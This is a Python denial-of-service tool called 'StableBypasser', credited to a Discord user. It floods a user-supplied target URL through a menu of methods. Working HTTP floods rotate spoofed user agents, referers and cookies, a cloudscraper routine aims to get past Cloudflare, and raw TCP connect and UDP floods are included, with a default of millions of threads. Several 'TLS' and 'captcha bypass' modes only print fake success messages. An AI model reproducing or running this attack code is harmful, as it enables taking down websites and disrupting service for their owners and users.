import threading
import requests
import random
import time
import os
import datetime
import cloudscraper
from urllib.parse import urlparse
import socket
import struct
import scapy.all as scapy

C_RESET = '\033[0m'
C_RED = '\033[91m'
C_GREEN = '\033[92m'
C_YELLOW = '\033[93m'
C_CYAN = '\033[96m'
C_WHITE = '\033[97m'
C_MAGENTA = '\033[95m'
C_BLUE = '\033[94m'
C_PURPLE = '\033[95m'
C_ORANGE = '\033[38;5;214m'
C_TEAL = '\033[38;5;51m'

banner = f"""
{C_GREEN}╔══════════════════════════════════════════════════╗{C_RESET}
{C_GREEN}║           {C_BLUE} StableBypasser  v4.1
{C_GREEN}╚══════════════════════════════════════════════════╝{C_RESET}
   By: {C_GREEN}@nullop1{C_RESET} on discord
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
]

HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"]

REFERERS = [
    "https://www.google.com",
    "https://www.bing.com",
    "https://www.yahoo.com",
    "https://www.duckduckgo.com",
    "https://www.wikipedia.org"
]

COOKIES = [
    "sessionId=abc123; path=/; HttpOnly",
    "userId=def456; path=/; HttpOnly",
    "theme=dark; path=/; HttpOnly",
    "language=en; path=/; HttpOnly"
]

PAYLOADS = [
    '{"key1":"value1", "key2":"value2"}',
    '{"name":"John Doe", "email":"john.doe@example.com"}',
    '{"username":"jdoe", "password":"securepassword"}'
]

def send_request(target_url, user_agent, http_method, referer, cookie, payload=None):
    headers = {
        "User-Agent": user_agent,
        "Referer": referer,
        "Cookie": cookie
    }
    try:
        if http_method == "GET":
            response = requests.get(target_url, headers=headers, timeout=5)
        elif http_method == "POST":
            response = requests.post(target_url, headers=headers, data=payload, timeout=5)
        elif http_method == "HEAD":
            response = requests.head(target_url, headers=headers, timeout=5)
        elif http_method == "OPTIONS":
            response = requests.options(target_url, headers=headers, timeout=5)
        elif http_method == "PUT":
            response = requests.put(target_url, headers=headers, data=payload, timeout=5)
        elif http_method == "DELETE":
            response = requests.delete(target_url, headers=headers, timeout=5)
        elif http_method == "PATCH":
            response = requests.patch(target_url, headers=headers, data=payload, timeout=5)
        print(f"{C_GREEN}[REQUEST] Sent {http_method} request to {target_url}. Status code: {response.status_code}{C_RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{C_RED}[REQUEST] Request failed: {e}{C_RESET}")

def ddos_normal(target, threads):
    def attack():
        while True:
            try:
                requests.get(target)
                print(f"{C_GREEN}[NORMAL] Packet Sent ✓{C_RESET}")
            except:
                print(f"{C_RED}[NORMAL] Connection Error ⚠{C_RESET}")
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def ddos_test(target, threads):
    def attack():
        while True:
            try:
                requests.get(target)
                print(f"{C_CYAN}[TEST] Packet Sent ✓{C_RESET}")
            except:
                print(f"{C_YELLOW}[TEST] Error ⚠{C_RESET}")
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def ddos_advanced(target, threads):
    def attack():
        while True:
            try:
                user_agent = random.choice(USER_AGENTS)
                http_method = random.choice(HTTP_METHODS)
                referer = random.choice(REFERERS)
                cookie = random.choice(COOKIES)
                payload = random.choice(PAYLOADS) if http_method in ["POST", "PUT", "PATCH"] else None
                send_request(target, user_agent, http_method, referer, cookie, payload)
                print(f"{C_MAGENTA}[ADVANCED] Packet Sent ✓{C_RESET}")
            except:
                print(f"{C_RED}[ADVANCED] Error ⚠{C_RESET}")
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def launch_bypass(target, threads, duration):
    until = time.time() + duration
    scraper = cloudscraper.create_scraper()

    def attack():
        while time.time() < until:
            try:
                scraper.get(target)
                print(f"{C_BLUE}[BYPASS] CF-BYPASS Packet ✓{C_RESET}")
            except:
                print(f"{C_RED}[BYPASS] Failed ⚠{C_RESET}")

    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def tls_stresser(target, threads, duration):
    until = time.time() + duration
    def attack():
        while time.time() < until:
            print(f"{C_CYAN}[TLS-STRESS] Fake TLS Packet ✓{C_RESET}")
            time.sleep(0.0001)
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def tls_spammer(target, threads, duration):
    until = time.time() + duration
    def attack():
        while time.time() < until:
            print(f"{C_GREEN}[TLS-SPAM] TLS Spam ✓{C_RESET}")
            time.sleep(0.0005)
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def tls_vip(target, threads, duration):
    until = time.time() + duration
    def attack():
        while time.time() < until:
            print(f"{C_MAGENTA}[TLS-VIP] Premium TLS Packet ✓{C_RESET}")
            time.sleep(0.0001)
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def captcha_bypass(target, threads, duration):
    until = time.time() + duration
    def attack():
        while time.time() < until:
            print(f"{C_YELLOW}[CAPTCHA-BYPASS] Fake Verification ✓{C_RESET}")
            time.sleep(0.002)
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def tls_kill(target, threads, duration):
    until = time.time() + duration
    def attack():
        while time.time() < until:
            print(f"{C_RED}[TLS-KILL] Fatal TLS Payload ☠{C_RESET}")
            time.sleep(0.0001)
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def l4_ddos(target, threads, duration):
    until = time.time() + duration
    def attack():
        while time.time() < until:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, 80))
                s.sendall(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
                s.close()
                print(f"{C_BLUE}[L4-DDoS] Packet Sent ✓{C_RESET}")
            except:
                print(f"{C_RED}[L4-DDoS] Connection Error ⚠{C_RESET}")
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def udp_pps(target, threads, duration):
    until = time.time() + duration
    def attack():
        while time.time() < until:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(b'PING', (target, 80))
                print(f"{C_YELLOW}[UDP-PPS] Packet Sent ✓{C_RESET}")
            except:
                print(f"{C_RED}[UDP-PPS] Connection Error ⚠{C_RESET}")
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def browser_method(target, threads, duration):
    until = time.time() + duration
    def attack():
        while time.time() < until:
            try:
                user_agent = random.choice(USER_AGENTS)
                referer = random.choice(REFERERS)
                cookie = random.choice(COOKIES)
                headers = {
                    "User-Agent": user_agent,
                    "Referer": referer,
                    "Cookie": cookie
                }
                response = requests.get(target, headers=headers, timeout=5)
                print(f"{C_GREEN}[BROWSER] Request Sent ✓{C_RESET}")
            except:
                print(f"{C_RED}[BROWSER] Request Failed ⚠{C_RESET}")
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def l7_ddos(target, threads, duration):
    until = time.time() + duration
    def attack():
        while time.time() < until:
            try:
                user_agent = random.choice(USER_AGENTS)
                http_method = random.choice(HTTP_METHODS)
                referer = random.choice(REFERERS)
                cookie = random.choice(COOKIES)
                payload = random.choice(PAYLOADS) if http_method in ["POST", "PUT", "PATCH"] else None
                send_request(target, user_agent, http_method, referer, cookie, payload)
                print(f"{C_MAGENTA}[L7-DDoS] Request Sent ✓{C_RESET}")
            except:
                print(f"{C_RED}[L7-DDoS] Request Failed ⚠{C_RESET}")
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def massive_l7_ddos(target, threads, duration):
    until = time.time() + duration
    def attack():
        while time.time() < until:
            try:
                user_agent = random.choice(USER_AGENTS)
                http_method = random.choice(HTTP_METHODS)
                referer = random.choice(REFERERS)
                cookie = random.choice(COOKIES)
                payload = random.choice(PAYLOADS) if http_method in ["POST", "PUT", "PATCH"] else None
                send_request(target, user_agent, http_method, referer, cookie, payload)
                print(f"{C_PURPLE}[MASSIVE L7-DDoS] Request Sent ✓{C_RESET}")
            except:
                print(f"{C_RED}[MASSIVE L7-DDoS] Request Failed ⚠{C_RESET}")
    for _ in range(threads * 10):  
        threading.Thread(target=attack, daemon=True).start()

def layer7_menu():
    os.system("cls" if os.name == "nt" else "clear")
    print(banner)

    print(f"""{C_GREEN}
╔═══════════════════════════════════════╗
║              SelectMethods MENU       ║
╠═══════════════════════════════════════╣
║ 1. Normal Attack  (For LowSite)       ║
║ 2. Test Attack   (For Test Your Own Server) ║
║ 3. Advanced Attack (Mix Attack,Bypass)║
║ 4. Cloudflare Bypass (BypassUnderMaintenance) (ddos is ok but cant bypass cloudflare) ║                
║ 5. TLS Stresser (UnderMaintenance)    ║
║ 6. TLS Spammer (UnderMaintenance)     ║
║ 7. TLS VIP (UnderMaintenance)  ║
║ 8. Captcha Bypass  (UnderMaintenance)  ║
║ 9. TLS-KILL (Custom)(UnderMaintenance)║
║ 10. L4 DDoS (Raw)(UnderMaintenance)║
║ 11. UDP-PPS  (UnderMaintenance)       ║
║ 12. Browser Method  (With UserAgent And good bypass OlderSite) ║
║ 13. L7 DDoS (GoodBypass And Mixed (Head-Post-Get))  ║
║ 14. Massive L7 DDoS UnderMaintenance  ║
╚═══════════════════════════════════════╝
{C_RESET}""")

    choice = input(f"{C_GREEN}Select Method You Want:  {C_RESET}")
    target = input(f"{C_GREEN}Give Target URL:  {C_RESET}")

    if not urlparse(target).scheme:
        print(f"{C_RED}Invalid URL!{C_RESET}")
        return

    if choice in ["4","5","6","7","8","9","10","11","12","13","14"]:
        try:
            duration = int(input(f"{C_WHITE}Duration (sec) -> {C_RESET}"))
        except:
            duration = 30

        try:
            threads = int(input(f"{C_WHITE}Threads (default=9999999) -> {C_RESET}") or 9999999)
        except:
            threads = 9999999

        print(f"{C_GREEN}Starting mode {choice}...{C_RESET}")

        if choice == "4": launch_bypass(target, threads, duration)
        if choice == "5": tls_stresser(target, threads, duration)
        if choice == "6": tls_spammer(target, threads, duration)
        if choice == "7": tls_vip(target, threads, duration)
        if choice == "8": captcha_bypass(target, threads, duration)
        if choice == "9": tls_kill(target, threads, duration)
        if choice == "10": l4_ddos(target, threads, duration)
        if choice == "11": udp_pps(target, threads, duration)
        if choice == "12": browser_method(target, threads, duration)
        if choice == "13": l7_ddos(target, threads, duration)
        if choice == "14": massive_l7_ddos(target, threads, duration)

        while True:
            time.sleep(1)

    else:
        threads = int(input(f"{C_WHITE}Threads -> {C_RESET}"))

        if choice == "1": ddos_normal(target, threads)
        elif choice == "2": ddos_test(target, threads)
        elif choice == "3": ddos_advanced(target, threads)
        else:
            print(f"{C_RED}Invalid Option!{C_RESET}")
            return

        while True:
            time.sleep(1)

layer7_menu()
